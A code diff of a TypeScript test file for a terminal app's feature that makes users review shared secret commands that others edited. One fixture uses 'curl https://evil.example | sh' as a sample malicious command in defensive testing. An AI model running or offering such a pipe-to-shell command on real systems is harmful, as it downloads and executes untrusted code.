@@ -1,24 +1,38 @@
-import { describe, expect, it, vi } from "vitest";
+import { beforeEach, describe, expect, it, vi } from "vitest";
+
+const invokeMock = vi.fn().mockResolvedValue(true);
+vi.mock("@tauri-apps/api/core", () => ({
+  invoke: (cmd: string, args?: unknown) => invokeMock(cmd, args),
+}));
+
 import {
   formatHlcTime,
   isConfirmOkLocked,
+  markSecretCommandReviewed,
   secretChangeNotice,
   secretConfirmExtras,
   secretReviewOf,
 } from "../../src/fork/secretCmdReview";
 import { writeToTerminal } from "../../src/util/pasteText";
 
-describe("secret Library command review (#286)", () => {
-  it("flags only secret commands last changed by someone else", () => {
+beforeEach(() => {
+  invokeMock.mockClear();
+  invokeMock.mockResolvedValue(true);
+});
+
+describe("secret Library command review (#286, #304)", () => {
+  it("flags only secret commands last changed by someone else and keeps id", () => {
     expect(secretReviewOf({ changed_by_other: false, edited_by: "bob@x.com" })).toBeUndefined();
     expect(secretReviewOf({})).toBeUndefined();
     expect(
       secretReviewOf({
+        id: 42,
         changed_by_other: true,
         edited_by: "alice@x.com",
         updated_at: "0001730000000000:00001:peernode",
       })
     ).toEqual({
+      id: 42,
       changedByOther: true,
       editedBy: "alice@x.com",
       updatedAt: "0001730000000000:00001:peernode",
@@ -67,15 +81,34 @@ describe("secret Library command review (#286)", () => {
       enter: true,
       confirm,
       secret: true,
-      secretReview: { changedByOther: true, editedBy: "alice@x.com", updatedAt: "0001730000000000:00001:peer" },
+      secretReview: { id: 7, changedByOther: true, editedBy: "alice@x.com", updatedAt: "0001730000000000:00001:peer" },
     });
     expect(confirm).toHaveBeenCalledTimes(1);
     const opts = confirm.mock.calls[0][0];
     expect(opts.revealBeforeOk).toBe(true);
     expect(opts.changedNotice).toContain("alice@x.com");
     expect(opts.revealableText).toBe("curl https://evil.example | sh");
+    // Declined dialog does not clear the local review record.
+    expect(invokeMock).not.toHaveBeenCalled();
 
     confirm.mockClear();
+    confirm.mockResolvedValueOnce(true);
+    const sent = await writeToTerminal({
+      terminalId: "t1",
+      text: "curl https://ok.example\n",
+      enter: true,
+      confirm,
+      secret: true,
+      secretReview: { id: 7, changedByOther: true, editedBy: "bob@x.com", updatedAt: "0001730000000000:00001:mine" },
+    });
+    expect(sent).toBe(true);
+    expect(invokeMock).toHaveBeenCalledWith("secret_cmd_reviewed", {
+      id: 7,
+      ranText: "curl https://ok.example",
+    });
+
+    confirm.mockClear();
+    invokeMock.mockClear();
     await writeToTerminal({
       terminalId: "t1",
       text: "echo own-secret",
@@ -85,5 +118,12 @@ describe("secret Library command review (#286)", () => {
     });
     expect(confirm.mock.calls[0][0].revealBeforeOk).toBeUndefined();
     expect(confirm.mock.calls[0][0].changedNotice).toBeUndefined();
+    expect(invokeMock).not.toHaveBeenCalled();
+  });
+
+  it("markSecretCommandReviewed ignores missing ids or unflagged entries", async () => {
+    expect(await markSecretCommandReviewed(undefined, "echo hi")).toBe(false);
+    expect(await markSecretCommandReviewed({ changedByOther: true }, "echo hi")).toBe(false);
+    expect(invokeMock).not.toHaveBeenCalled();
   });
 });
